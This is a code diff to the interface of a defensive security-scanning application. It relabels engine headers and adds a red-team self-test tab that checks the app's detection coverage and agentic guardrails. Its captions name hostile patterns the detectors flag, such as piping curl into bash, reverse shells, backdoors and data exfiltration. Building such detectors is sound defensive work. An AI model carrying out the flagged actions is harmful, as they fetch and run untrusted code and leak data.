         "Compliance Auditor, Code Quality Metrics, Attack Surface Mapper, "
@@ -11368,7 +11768,7 @@ with tab_advanced:
 
     # ── PORT SCANNER ──────────────────────────────────────────────────────────
     with adv_net:
-        st.markdown("#### 🔌 Advanced Network Port Scanner")
+        render_engine_header("🔌", "Advanced Network Port Scanner", "Authorized-scope port scanning with service risk notes.", "📡 Network & Infrastructure", "")
         st.warning("⚠️ Only scan hosts you own or have written permission to test.")
         st.caption(f"Checks {len(WELL_KNOWN_SERVICES)} well-known ports with service fingerprinting, "
                    f"banner grabbing, and structured risk scoring.")
@@ -11424,7 +11824,7 @@ with tab_advanced:
 
     # ── MALWARE DETECTOR ─────────────────────────────────────────────────────
     with adv_mal:
-        st.markdown("#### 🦠 Malware & Obfuscation Pattern Detector")
+        render_engine_header("🦠", "Malware & Obfuscation Pattern Detector", "Reverse shells, backdoors, cryptominers, obfuscation patterns.", "🔍 Static Detection", "")
         st.caption(f"Scans for reverse shells, obfuscated payloads, cryptominers, backdoors, "
                    f"data exfiltration, and privilege escalation patterns across "
                    f"{len(MALWARE_PATTERNS)} curated signatures.")
@@ -11466,7 +11866,7 @@ with tab_advanced:
 
     # ── CONTAINER SECURITY ────────────────────────────────────────────────────
     with adv_cont:
-        st.markdown("#### 🐳 Container Security Analyzer")
+        render_engine_header("🐳", "Container Security Analyzer", "Dockerfile/compose misconfigurations: root user, curl|bash, latest tags, baked-in secrets.", "🔍 Static Detection", "")
         st.caption(f"Analyzes Dockerfiles, docker-compose.yml, and Kubernetes manifests across "
                    f"{len(DOCKERFILE_CHECKS) + len(COMPOSE_CHECKS) + len(K8S_CHECKS)} checks.")
 
@@ -11512,7 +11912,7 @@ with tab_advanced:
 
     # ── COMPLIANCE AUDITOR ────────────────────────────────────────────────────
     with adv_comp:
-        st.markdown("#### 📜 Compliance Auditor")
+        render_engine_header("📜", "Compliance Auditor", "Maps findings onto PCI-DSS, HIPAA, SOC 2, GDPR, NIST CSF, and ISO 27001.", "📦 Supply Chain & Compliance", "")
         st.caption("Maps findings from Code Scanner, Semantic Scanner, Dependency CVEs, and "
                    "Malware Detector onto PCI-DSS, HIPAA, SOC 2, GDPR, NIST CSF, and ISO 27001.")
 
@@ -11560,7 +11960,7 @@ with tab_advanced:
 
     # ── CODE QUALITY ──────────────────────────────────────────────────────────
     with adv_qual:
-        st.markdown("#### 📐 Code Quality Metrics Engine")
+        render_engine_header("📐", "Code Quality Metrics Engine", "Cyclomatic complexity, maintainability index, nesting depth.", "🔍 Static Detection", "")
         st.caption("Cyclomatic complexity, maintainability index, nesting depth, and "
                    "duplicate-block detection for Python source files.")
 
@@ -11615,7 +12015,7 @@ with tab_advanced:
 
     # ── ATTACK SURFACE ────────────────────────────────────────────────────────
     with adv_surf:
-        st.markdown("#### 🗺️ Attack Surface Mapper")
+        render_engine_header("🗺️", "Attack Surface Mapper", "Enumerates HTTP routes, CLI arguments, environment variables, and network entry points.", "🧠 Intelligence & Correlation", "")
         st.caption("Enumerates HTTP routes, CLI arguments, environment variables, and network "
                    "listeners as external entry points, scored by exposure level.")
 
@@ -11655,7 +12055,7 @@ with tab_advanced:
 
     # ── POSTURE SCORE ─────────────────────────────────────────────────────────
     with adv_posture:
-        st.markdown("#### 🎯 Security Posture Score")
+        render_engine_header("🎯", "Security Posture Score", "Aggregates every engine's output into one tracked 0-100 score over time.", "🧠 Intelligence & Correlation", "")
         st.caption("Aggregates findings from every engine in this app into a single 0-100 score.")
 
         if st.button("🎯 Calculate Posture Score", type="primary", key="run_posture"):
@@ -11700,7 +12100,7 @@ with tab_advanced:
 
     # ── THREAT HUNTER ─────────────────────────────────────────────────────────
     with adv_hunt:
-        st.markdown("#### 🕵️ Threat Hunter")
+        render_engine_header("🕵️", "Threat Hunter", "IoC matching across network telemetry and malware findings.", "🧠 Intelligence & Correlation", "")
         st.caption(f"Correlates network telemetry against a {len(KNOWN_MALICIOUS_IOCS)}-entry IoC feed, "
                    "detects persistence/lateral-movement indicators, and identifies beaconing candidates.")
 
@@ -11743,7 +12143,7 @@ with tab_advanced:
 
     # ── EXPLOIT CHAINS ────────────────────────────────────────────────────────
     with adv_chains:
-        st.markdown("#### 🔗 Exploit Chain Correlator")
+        render_engine_header("🔗", "Exploit Chain Correlator", "Links findings across engines into multi-step attack chains.", "🧠 Intelligence & Correlation", "")
         st.caption(
             "Individual findings are scored alone elsewhere in this app. This tab cross-references "
             "them: an SSRF that reaches an unauthenticated internal database, an internet-facing "
@@ -11791,7 +12191,7 @@ with tab_advanced:
 
     # ── EVASION DETECTOR ─────────────────────────────────────────────────────
     with adv_evasion:
-        st.markdown("#### 🧬 Evasion Detector — Adversarial-Robustness Layer")
+        render_engine_header("🧬", "Evasion Detector — Adversarial-Robustness Layer", "Finds code structured to dodge scanners: dynamic dispatch, decode-then-execute.", "🔍 Static Detection", "")
         st.caption(
             "Every other engine in this app recognizes a KNOWN SHAPE — a literal call name, a "
             "literal string pattern. This engine looks for the opposite: code STRUCTURED to dodge "
@@ -11833,10 +12233,12 @@ with tab_advanced:
                 "is found, the same way any test suite grows."
             )
             if st.button("🧪 Run Coverage Self-Test", type="primary", key="run_evasion_selftest"):
-                report = run_evasion_self_test()
+                report = run_evasion_self_test(feedback_engine=adaptive_feedback)
                 pct = report["caught"] / report["total"] if report["total"] else 0
                 if pct == 1.0:
-                    st.success(f"✅ {report['caught']}/{report['total']} known technique(s) currently caught.")
+                    st.success(f"✅ {report['caught']}/{report['total']} known technique(s) currently caught. "
+                              f"{report['caught']} confirmation(s) auto-recorded to the learning engine "
+                              f"(Developer Toolkit → Baseline Manager).")
                 else:
                     st.warning(f"⚠️ {report['caught']}/{report['total']} known technique(s) currently caught "
                               f"— the rest are documented gaps, not silent ones.")
@@ -11849,7 +12251,7 @@ with tab_advanced:
 # TAB: AGENT SWARM
 # ------------------------------------------------------------------------
 with tab_swarm:
-    st.markdown("### 🐝 Agent Swarm — Authorized Deep-Audit Orchestrator")
+    render_engine_header("🐝", "Agent Swarm — Authorized Deep-Audit Orchestrator", "Parallel multi-engine task execution with adaptive concurrency, retry, and strict scope enforcement.", "🐝 Orchestration & Authorization", "")
     st.caption(
         "Fans a task queue out across a bounded worker pool: every file, URL, or host you "
         "provide becomes one task, processed in parallel. Worker concurrency is capped at "
@@ -11866,7 +12268,7 @@ with tab_swarm:
 
     # ── AUTHORIZATION SCOPE ──────────────────────────────────────────────────
     with swarm_scope:
-        st.markdown("#### 🔐 Authorized Scope")
+        render_engine_header("🔐", "Authorized Scope", "Nothing is authorized by default — every target must be added explicitly.", "🐝 Orchestration & Authorization", "")
         st.caption("Nothing is authorized by default. Add each domain, IP, or local directory "
                    "you own or have written permission to test before it can be scanned.")
 
@@ -11914,7 +12316,7 @@ with tab_swarm:
 
     # ── LAUNCH SWARM ──────────────────────────────────────────────────────────
     with swarm_launch:
-        st.markdown("#### 🚀 Launch a Swarm")
+        render_engine_header("🚀", "Launch a Swarm", "Directories, uploaded files, URLs, or hosts — all checked against declared scope first.", "🐝 Orchestration & Authorization", "")
 
         target_kind = st.radio(
             "Target type",
@@ -12053,7 +12455,7 @@ with tab_swarm:
 
     # ── RESULTS ───────────────────────────────────────────────────────────────
     with swarm_results:
-        st.markdown("#### 📊 Swarm Run Results")
+        render_engine_header("📊", "Swarm Run Results", "Task-by-task outcome, findings, and the synthesized intelligence briefing.", "🐝 Orchestration & Authorization", "")
         swarm_reports = st.session_state.swarm_reports
 
         if not swarm_reports:
@@ -12129,7 +12531,7 @@ with tab_swarm:
 # TAB: DEVELOPER TOOLKIT
 # ------------------------------------------------------------------------
 with tab_toolkit:
-    st.markdown("### 🧰 Developer Toolkit")
+    render_engine_header("🧰", "Developer Toolkit", "Diff scanning, baseline suppression, custom rules, the knowledge base, red-team self-test.", "📚 Learning, Rules & Reporting", "5 tools")
     st.caption(
         "Diff Scanner (CI/CD-style — flags only NEW vulnerabilities between two versions), "
         "Baseline/Suppression Manager (accepted-risk tracking with mandatory justification), "
@@ -12137,13 +12539,14 @@ with tab_toolkit:
         "and the Vulnerability Knowledge Base."
     )
 
-    tk_diff, tk_baseline, tk_rules, tk_kb = st.tabs([
+    tk_diff, tk_baseline, tk_rules, tk_kb, tk_redteam = st.tabs([
         "🔀 Diff Scanner", "✅ Baseline Manager", "🛠️ Custom Rule Builder", "📚 Knowledge Base",
+        "🎯 Red Team Self-Test",
     ])
 
     # ── DIFF SCANNER ──────────────────────────────────────────────────────────
     with tk_diff:
-        st.markdown("#### 🔀 Diff Scanner")
+        render_engine_header("🔀", "Diff Scanner", "Compares two code versions, flags newly-introduced vulnerabilities.", "📚 Learning, Rules & Reporting", "")
         st.caption("Compares an old and new version of the same file. Fingerprints findings by "
                    "rule + normalized snippet (not line number, since lines shift on every edit) "
                    "so pre-existing debt doesn't get misreported as new. FAILs only if a new "
@@ -12192,7 +12595,7 @@ with tab_toolkit:
 
     # ── BASELINE MANAGER ──────────────────────────────────────────────────────
     with tk_baseline:
-        st.markdown("#### ✅ Baseline Manager & Adaptive Rule Reliability")
+        render_engine_header("✅", "Baseline Manager & Adaptive Rule Reliability", "False-positive suppression plus feedback-integrity and contextual-confidence learning.", "📚 Learning, Rules & Reporting", "")
         st.caption(
             "Confirm or suppress findings with a human judgment call — both feed a supervised "
             "reliability tracker per rule. This is deliberately NOT autonomous learning: nothing "
@@ -12391,7 +12794,7 @@ with tab_toolkit:
 
     # ── CUSTOM RULE BUILDER ───────────────────────────────────────────────────
     with tk_rules:
-        st.markdown("#### 🛠️ Custom Rule Builder")
+        render_engine_header("🛠️", "Custom Rule Builder", "Extend the pattern scanner or malware detector at runtime.", "📚 Learning, Rules & Reporting", "")
         st.caption("Extend the multi-language pattern scanner or malware detector at runtime — "
                    "no source code editing required. Every regex is validated before it can be added.")
 
@@ -12461,7 +12864,7 @@ with tab_toolkit:
 
     # ── KNOWLEDGE BASE ────────────────────────────────────────────────────────
     with tk_kb:
-        st.markdown("#### 📚 Vulnerability Knowledge Base")
+        render_engine_header("📚", "Vulnerability Knowledge Base", "CWE reference library tied to every finding across this app.", "📚 Learning, Rules & Reporting", "")
         st.caption(f"{len(knowledge_base.kb)} CWE entries — descriptions, real-world context, "
                    "common causes, and prevention checklists, tied to every finding across this app.")
 
@@ -12482,9 +12885,98 @@ with tab_toolkit:
                     st.markdown(f"- ☐ {p}")
                 st.caption(f"Further reading: {entry.further_reading}")
 
+    # ── RED TEAM SELF-TEST ───────────────────────────────────────────────────
+    with tk_redteam:
+        render_engine_header("🎯", "Red Team Self-Test", "Worst-case vectors and agentic-overreach tests against this app's own guardrails.", "⚡ Response & Remediation", "")
+        st.caption(
+            "Runs this app's OWN engines against a curated battery of worst-case test vectors — "
+            "every case is a safe, non-functional signature (RFC 5737 reserved test-net addresses, "
+            "payloads that do nothing worse than print a number) built the same way antivirus vendors "
+            "build their own signature test suites, not working malware. Two parts: detection coverage "
+            "(does the tool catch what it claims to catch, including compounded evasion), and agentic "
+            "overreach (do the safety guardrails — Autonomy Boundary Guard, Authorization Manager, the "
+            "Auto-Response circuit breaker — actually hold under deliberate adversarial pressure). "
+            "Results are reported honestly, misses included — new cases get added here whenever a real "
+            "gap is found, the same way this app's own test suite grew during development. Every rule "
+            "that correctly fires here auto-records a confirmation to the learning engine — safe to "
+            "automate ONLY here, because these test cases have known, authored ground truth. A real "
+            "finding on your own code still always needs your confirmation, exactly as before."
+        )
+
+        if st.button("🎯 Run Full Red Team Self-Test", type="primary", key="run_red_team"):
+            rt_engines = {
+                "semantic": semantic_scanner, "code": code_scanner,
+                "pattern": semantic_scanner.pattern_scanner,
+                "malware": malware_scanner, "secrets": entropy_scanner,
+            }
+            with st.spinner("Running worst-case vulnerability, evasion, and malware signature tests..."):
+                detection_report = run_red_team_self_test(rt_engines, feedback_engine=adaptive_feedback)
+            with st.spinner("Testing agentic overreach against a fresh, isolated guard instance..."):
+                # Fresh instances so this never disturbs the real session's
+                # declarations, scope, or circuit-breaker state.
+                _test_auth = AuthorizationManager()
+                _test_guard = AutonomyBoundaryGuard()
+                _test_containment = ActiveContainmentEngine()
+                _test_auto_response = AutoResponseEngine(_test_containment, max_actions_per_window=5, window_seconds=300)
+                overreach_report = run_agentic_overreach_self_test(_test_auth, _test_guard, _test_auto_response)
+
+            st.session_state.last_red_team_detection = detection_report
+            st.session_state.last_red_team_overreach = overreach_report
+
+        detection_report = st.session_state.get("last_red_team_detection")
+        overreach_report = st.session_state.get("last_red_team_overreach")
+
+        if detection_report:
+            st.markdown("##### 🧪 Detection Coverage")
+            pct = detection_report["caught"] / detection_report["total"] if detection_report["total"] else 0
+            if pct == 1.0:
+                st.success(f"✅ {detection_report['caught']}/{detection_report['total']} worst-case vectors caught.")
+            else:
+                st.warning(f"⚠️ {detection_report['caught']}/{detection_report['total']} caught — "
+                          f"the rest are real, documented gaps, not hidden ones.")
+            if detection_report.get("auto_learned_count"):
+                st.caption(f"🧠 {detection_report['auto_learned_count']} rule confirmation(s) auto-recorded "
+                          f"to the learning engine across every engine that fired — see Developer "
+                          f"Toolkit → Baseline Manager for the resulting precision trends.")
+
+            rt1, rt2, rt3 = st.columns(3)
+            with rt1:
+                st.markdown("**Worst-Case Vulnerabilities**")
+                for r in detection_report["vuln_results"]:
+                    icon = "✅" if r["caught"] else "❌"
+                    st.caption(f"{icon} {r['label']}")
+            with rt2:
+                st.markdown("**Compounded Evasion**")
+                for r in detection_report["evasion_results"]:
+                    icon = "✅" if r["caught"] else "❌"
+                    st.caption(f"{icon} {r['label']} ({r['technique_count']} technique(s) flagged)")
+            with rt3:
+                st.markdown("**Malware Signatures**")
+                for r in detection_report["malware_results"]:
+                    icon = "✅" if r["caught"] else "❌"
+                    st.caption(f"{icon} {r['label']}")
+
+        if overreach_report:
+            st.markdown("---")
+            st.markdown("##### 🛡️ Agentic Overreach — Do the Guardrails Hold?")
+            pct2 = overreach_report["held"] / overreach_report["total"] if overreach_report["total"] else 0
+            if pct2 == 1.0:
+                st.success(f"✅ {overreach_report['held']}/{overreach_report['total']} guardrails held under "
+                          f"deliberate adversarial pressure.")
+            else:
+                st.error(f"🚨 Only {overreach_report['held']}/{overreach_report['total']} guardrails held — "
+                        f"see below for which one didn't.")
+            for r in overreach_report["results"]:
+                icon = "✅ HELD" if r["held"] else "❌ DID NOT HOLD"
+                st.caption(f"{icon} — {r['label']}")
+
+        if not detection_report and not overreach_report:
+            st.info("Click above to run the full battery. Nothing runs automatically — this is an "
+                    "on-demand check, not a background process.")
+
 
 with tab_report:
-    st.markdown("### 📄 Export Consolidated Report")
+    render_engine_header("📄", "Export Consolidated Report", "CSV/JSON export of findings across every engine.", "📚 Learning, Rules & Reporting", "")
     report_name = st.text_input("Report name", value=f"sentinel_report_{datetime.now().strftime('%Y%m%d_%H%M')}")
 
     st.markdown(f"- Code findings included (regex engine): **{len(findings)}**")
